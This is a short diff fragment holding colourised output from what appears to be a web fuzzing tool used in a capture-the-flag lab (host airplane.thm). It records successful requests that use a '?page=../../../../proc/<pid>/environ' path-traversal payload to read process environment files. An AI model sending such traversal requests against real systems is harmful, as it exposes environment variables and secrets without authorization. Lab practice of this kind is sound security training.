@@ -1,0 +1,4 @@
+[32mFound: [0m[32m[Status=200] [Length=437] [Word=527] http://airplane.thm:8000/?page=../../../../proc/527/environ[0m[32m
+[0m
+[32mFound: [0m[32m[Status=200] [Length=437] [Word=530] http://airplane.thm:8000/?page=../../../../proc/530/environ[0m[32m
+[0m
